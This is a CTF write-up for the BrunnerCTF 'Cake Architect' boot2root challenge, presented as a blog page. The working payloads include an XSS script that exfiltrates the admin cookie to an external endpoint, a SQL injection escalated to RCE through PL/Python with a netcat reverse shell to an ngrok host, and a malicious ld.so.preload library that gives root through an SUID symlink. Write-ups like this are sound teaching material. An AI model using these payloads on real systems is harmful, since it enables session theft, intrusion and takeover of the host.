                                        {% else %}
                                            <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"badge bg-warning"</span><span class="nt">&gt;</span>Private<span class="nt">&lt;/span&gt;</span>
                                        {% endif %}
                                    <span class="nt">&lt;/div&gt;</span>
                                    <span class="nt">&lt;div&gt;</span>
                                        <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"btn btn-outline-success"</span> <span class="na">onclick=</span><span class="s">"copyCakeUrl()"</span><span class="nt">&gt;</span>
                                            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-share me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>Share
                                        <span class="nt">&lt;/button&gt;</span>
                                    <span class="nt">&lt;/div&gt;</span>
                                <span class="nt">&lt;/div&gt;</span>
                            <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/main&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="c1">// Load and display ingredients</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">DOMContentLoaded</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">ingredients</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="dl">'</span><span class="s1">{{ cake[2] | tojson | safe }}</span><span class="dl">'</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">ingredientsList</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">ingredients-list</span><span class="dl">'</span><span class="p">);</span>
            
            <span class="k">if </span><span class="p">(</span><span class="nx">ingredients</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">ingredients</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="p">[</span><span class="nx">ingredient</span><span class="p">,</span> <span class="nx">amount</span><span class="p">]</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">entries</span><span class="p">(</span><span class="nx">ingredients</span><span class="p">))</span> <span class="p">{</span>
                    <span class="kd">const</span> <span class="nx">ingredientDiv</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">div</span><span class="dl">'</span><span class="p">);</span>
                    <span class="nx">ingredientDiv</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">ingredient-item</span><span class="dl">'</span><span class="p">;</span>
                    <span class="nx">ingredientDiv</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`&lt;strong&gt;</span><span class="p">${</span><span class="nx">ingredient</span><span class="p">}</span><span class="s2">:&lt;/strong&gt; </span><span class="p">${</span><span class="nx">amount</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
                    <span class="nx">ingredientsList</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">ingredientDiv</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">ingredientsList</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">&lt;p class="text-muted"&gt;No ingredients listed.&lt;/p&gt;</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">});</span>

        <span class="kd">function</span> <span class="nf">copyCakeUrl</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">cakeUrl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
            <span class="nb">navigator</span><span class="p">.</span><span class="nx">clipboard</span><span class="p">.</span><span class="nf">writeText</span><span class="p">(</span><span class="nx">cakeUrl</span><span class="p">).</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Cake URL copied to clipboard!</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">err</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Failed to copy cake URL: </span><span class="dl">'</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Failed to copy cake URL.</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">});</span>
        <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</pre></td></tr></tbody></table></code></div>  </div>

</details>

<h3 id="identifying-vulnerabilities"><span class="me-2">Identifying vulnerabilities</span><a href="#identifying-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>The flask <code class="language-plaintext highlighter-rouge">session</code> cookie is <strong>NOT</strong> HTTP Only</li>
  <li>There is an admin bot that visits “Show Cake” pages that we submit</li>
  <li>We can create “Cakes” pages</li>
  <li>The “Show cake” page is vulnerable to XSS, because data is inserted without sanitization, and shown with <code class="language-plaintext highlighter-rouge">| safe</code> which means: <em>“Disable every automatic protections”</em>.</li>
  <li>The admin have access to an endpoint that is vulnerable to SQLi, <code class="language-plaintext highlighter-rouge">calculate_nutrition(cake_id)</code> directly does <code class="language-plaintext highlighter-rouge">"SELECT ingredients FROM cakes WHERE id = {cake_id}"</code> with cake_id a user supplied value.</li>
  <li>The <code class="language-plaintext highlighter-rouge">postgresql-plpython3-15</code> module is installed in the <code class="language-plaintext highlighter-rouge">Docker.db</code>, which means we can execute python via postgresql, that means that every SQLi can be escalated to an RCE.</li>
</ul>

<h1 id="exploitation">Exploitation</h1>

<h3 id="get-admin"><span class="me-2">Get admin</span><a href="#get-admin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Since we do not have access to the SQLi vulnerable endpoint because we’re not admin, we’ll start by stealing the admin <code class="language-plaintext highlighter-rouge">session</code> cookie. To do so, we need to signup, then login, to get access to this page:</p>

<p><a href="/assets/img/writeups/cake_architect/dash.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/dash.png" alt="index"  loading="lazy"></a>
<em>Dashboard page</em></p>

<p>We hit the “New cake” button on the top-right corner. I will use <a href="https://app.beeceptor.com/console/cookiestealer">this beeceptor endpoint</a> to capture the token, and this simple XSS payload:</p>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://cookiestealer.free.beeceptor.com?cookie=</span><span class="dl">"</span> <span class="o">+</span> <span class="nf">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span> 
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/writeups/cake_architect/xss_exploitation.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/xss_exploitation.png" alt="index"  loading="lazy"></a>
<em>Exploiting the XSS</em></p>

<p>Our newly created cake has the id number 10:</p>

<p><a href="/assets/img/writeups/cake_architect/id_10.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/id_10.png" alt="index"  loading="lazy"></a>
<em>ID = 10</em></p>

<p>Let’s report this cake to the admin:</p>

<p><a href="/assets/img/writeups/cake_architect/reporting.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/reporting.png" alt="index"  loading="lazy"></a>
<em>Reporting the trapped show cake page</em></p>

<p><a href="/assets/img/writeups/cake_architect/callback.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/callback.png" alt="index"  loading="lazy"></a>
<em>Admin session token</em></p>

<p>And here we go! Now we just have to base64 decode it, and add it in <kbd>Ctrl + Shift + I</kbd>, then to the <code class="language-plaintext highlighter-rouge">storage</code> tab</p>

<p><a href="/assets/img/writeups/cake_architect/using_the_stolen_cookie.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/using_the_stolen_cookie.png" alt="index"  loading="lazy"></a>
<em>Using the stolen cookie</em></p>

<h3 id="sqli-to-rce"><span class="me-2">SQLi to RCE</span><a href="#sqli-to-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="/assets/img/writeups/cake_architect/admin_dashboard.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/admin_dashboard.png" alt="index"  loading="lazy"></a>
<em>Admin dashboard</em></p>

<p>Ok, so now, we have access to the admin dashboard, and we have access to the SQLi vulnerable thing. As I said earlier, postgresql-plpython3 is installed, so it’es basically auto RCE. I’ll use <a href="https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf">this payload</a>, from OWASP, to weaponize my SQLi into an RCE via arbitrary python execution:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>• CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu
• SELECT proxyshell(os command)
</pre></td></tr></tbody></table></code></div></div>

<h3 id="get-reverse-shell"><span class="me-2">Get reverse shell</span><a href="#get-reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>I adapted the payload to get a reverse-shell:</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="p">;</span> <span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">proxyshell</span><span class="p">(</span><span class="nb">text</span><span class="p">)</span> <span class="k">RETURNS</span> <span class="nb">text</span> <span class="k">AS</span> <span class="s1">'import os; return os.popen(args[0]).read()'</span> <span class="k">LANGUAGE</span> <span class="n">plpython3u</span><span class="p">;</span> <span class="k">SELECT</span> <span class="n">proxyshell</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 0.tcp.eu.ngrok.io 13818 &gt;/tmp/f'</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I end the first query, use the <code class="language-plaintext highlighter-rouge">CREATE FUNCTION</code> thing to create my RCE function, then call it using a <code class="language-plaintext highlighter-rouge">SELECT</code> statement.</p>

<p><a href="/assets/img/writeups/cake_architect/RCE.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/cake_architect/RCE.png" alt="index"  loading="lazy"></a>
<em>Initial access</em></p>

<h3 id="user-flag"><span class="me-2">User flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div file="/user.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="/user.txt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>brunner{XSS_y0UR_w4y_T0_Pyth0N3_1N_P0sTgR35?!}
</pre></td></tr></tbody></table></code></div></div>

<h1 id="privesc">Privesc</h1>

<h3 id="stabilizing-shell"><span class="me-2">Stabilizing Shell</span><a href="#stabilizing-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Ok now to the most difficult part ! I start by stabilizing my shell:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
postgres@ctf-cake-architect-user-dc97708dd266a162-5ffbff8cc9-sjl4j:~/data<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
postgres@ctf-cake-architect-user-dc97708dd266a162-5ffbff8cc9-sjl4j:~/data<span class="nv">$ PS1</span><span class="o">=</span><span class="s2">"</span><span class="se">\u</span><span class="s2"> </span><span class="se">\w</span><span class="s2"> </span><span class="nv">$ </span><span class="s2">"</span>
postgres ~/data <span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p><kbd>Ctrl + Z</kbd></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="o">&amp;&amp;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 53186 continued  nc <span class="nt">-nvlp</span> 4444

postgres ~/data <span class="nv">$ </span>  
</pre></td></tr></tbody></table></code></div></div>

<p>And we’re good to go.</p>

<h3 id="abusing-usrlocalbincake_logger"><span class="me-2">Abusing /usr/local/bin/cake_logger</span><a href="#abusing-usrlocalbincake_logger" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>As you may have noticed, there is a custom root SUID binary called <code class="language-plaintext highlighter-rouge">cake_logger</code> added by the <a href="#dockerfiledb">Dockerfile.db</a>. Let’s try to execute it:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>postgres ~/data <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span> /usr/local/bin/cake_logger 
<span class="nt">-rwsr-xr-x</span><span class="nb">.</span> 1 root root 16K Aug 21 06:32 /usr/local/bin/cake_logger

postgres ~/data <span class="nv">$ </span>/usr/local/bin/cake_logger
Usage:
  To add recipe: /usr/local/bin/cake_logger &lt;recipe_file&gt; &lt;recipe_text&gt;
  To create shortcut: /usr/local/bin/cake_logger <span class="nt">-link</span> &lt;source_recipe&gt; &lt;link_path&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Unfortunately we can’t write to a file that is not owned by us:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>postgres / <span class="nv">$ </span> /usr/local/bin/cake_logger /etc/passwd <span class="s2">"root::0:0::/root:/bin/bash"</span>
Checking <span class="k">if </span>you can modify the recipe...
This recipe doesnt belong to you!
</pre></td></tr></tbody></table></code></div></div>

<p>And we can’t override files using the symlink options:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>postgres /dev/shm <span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"root::0:0::/root:/bin/bash"</span> <span class="o">&gt;</span> my_new_passwd

postgres /dev/shm <span class="nv">$ </span>/usr/local/bin/cake_logger <span class="nt">-link</span> my_new_passwd /etc/passwd 
Creating a shortcut to your recipe...
Failed to create recipe shortcut: File exists
</pre></td></tr></tbody></table></code></div></div>

<p>Fortunately, we can create symlinks as root (so basically everywhere in the filesystem), as long as that doesn’t override an already existing files. I noticed that <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> wasn’t existing on the victim machine, so we can create a fake one to get easy privesc. Let’s do this:</p>

<p>First create the malicious .so library:</p>

<div file="root.c" class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="root.c"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
    <span class="n">chmod</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If this .so library gets executed as root it’s game over!
Let’s compile it:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>❯ gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-nostartfiles</span> <span class="nt">-o</span> root.so root.c      
</pre></td></tr></tbody></table></code></div></div>

<p>I copied it in <code class="language-plaintext highlighter-rouge">/dev/shm/malicious_lib.so</code> on the victim machine:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>postgres / <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /dev/shm/malicious_lib.so 
<span class="nt">-rw-------</span><span class="nb">.</span> 1 postgres postgres 14184 Aug 23 14:37 /dev/shm/malicious_lib.so
</pre></td></tr></tbody></table></code></div></div>

<p>Now we gotta create the <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> file. It should be a text file containing the path to our <code class="language-plaintext highlighter-rouge">.so</code> library:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>postgres / <span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/dev/shm/malicious_lib.so"</span> <span class="o">&gt;</span> /dev/shm/ld.so.preload
</pre></td></tr></tbody></table></code></div></div>

<p>Now, using the <code class="language-plaintext highlighter-rouge">cake_logger</code> link functionnality, I create a symlink from <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> to <code class="language-plaintext highlighter-rouge">/dev/shm/ld.so.preload</code>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>postgres / <span class="nv">$ </span>cake_logger <span class="nt">-link</span> /dev/shm/ld.so.preload /etc/ld.so.preload
Creating a shortcut to your recipe...
Shortcut created successfully! Now you can access your recipe from multiple places.

postgres / <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/ld.so.preload 
lrwxrwxrwx. 1 root postgres 22 Aug 23 14:47 /etc/ld.so.preload -&gt; /dev/shm/ld.so.preload

postgres / <span class="nv">$ </span><span class="nb">cat</span> /etc/ld.so.preload 
/dev/shm/malicious_lib.so
</pre></td></tr></tbody></table></code></div></div>

<p>Finally, we just have to execute a random SUID binary, since all SUID binaries are executed as root !</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>postgres / <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 root root 1265648 Apr 18 22:47 /bin/bash

postgres / <span class="nv">$ </span><span class="c"># mount is an SUID binaries</span>
postgres / <span class="nv">$ </span>mount <span class="o">&gt;</span> /dev/null

postgres / <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
<span class="nt">-rwsr-xr-x</span><span class="nb">.</span> 1 root root 1265648 Apr 18 22:47 /bin/bash
</pre></td></tr></tbody></table></code></div></div>

<h3 id="root-flag"><span class="me-2">Root flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>postgres / <span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
bash-5.2# <span class="nb">ls</span> /root
root.txt
bash-5.2# <span class="nb">cat</span> /root/root.txt 
brunner<span class="o">{</span>Wh4T_t1M3_15_1T?_FL4G_0_CL0CK!!<span class="o">}</span>
bash-5.2# 
</pre></td></tr></tbody></table></code></div></div>

<div file="/root/root.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="/root/root.txt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>brunner{Wh4T_t1M3_15_1T?_FL4G_0_CL0CK!!}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/writeups/">Writeups</a>,
          <a href="/categories/ctftime2025/">CTFTime2025</a>,
          <a href="/categories/brunnerctf/">BrunnerCTF</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeups/"
            class="post-tag no-text-decoration"
          >writeups</a>
        
          <a
            href="/tags/boot2root/"
            class="post-tag no-text-decoration"
          >boot2root</a>
        
          <a
            href="/tags/flask/"
            class="post-tag no-text-decoration"
          >flask</a>
        
          <a
            href="/tags/xss/"
            class="post-tag no-text-decoration"
          >xss</a>
        
          <a
            href="/tags/sql-injection/"
            class="post-tag no-text-decoration"
          >sql-injection</a>
        
          <a
            href="/tags/privesc/"
            class="post-tag no-text-decoration"
          >privesc</a>
        
          <a
            href="/tags/suid/"
            class="post-tag no-text-decoration"
          >suid</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=BrunnerCTF%20-%20Cake%20Architect%20-%20NullBrunk&url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fbrunnerctf-cake-architect%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=BrunnerCTF%20-%20Cake%20Architect%20-%20NullBrunk&u=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fbrunnerctf-cake-architect%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fbrunnerctf-cake-architect%2F&text=BrunnerCTF%20-%20Cake%20Architect%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>

            
          </main>

         
            <!-- panel -->
            <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
              <div class="access">
                

  <section id="toc-wrapper">
    <h2 class="panel-heading no-border">Event</h2>
    <ul class="content list-unstyled no-border ps-0 pb-1 ms-1 mt-2 toc-list ">
    
      <li class="toc-list-item">
        <a class="toc-link node-name--H2 img-link fw-600 blue-sidebar"> <i class="fa-solid fa-ranking-star mr-11-px"></i> 175 / 1157  </a>
      </li>

      <li class="toc-list-item no-border">
        <a class="toc-link node-name--H2 img-link fw-600" href="https://ctftime.org/event/2835/" target="_blank"> <i class="fa-solid fa-link mr-11-px"></i>Link</a>
      </li>

    </ul>
  </section>





                

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/boot2root/">boot2root</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/flask/">flask</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/xss/">xss</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/sql-injection/">sql-injection</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">privesc</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/suid/">suid</a>
          
        </div>
      </nav>
  </section>


              </div>

              
                
                






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-1 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>

              
            </aside>
          
        </div>

        <div class="row">
          <!-- tail -->

          
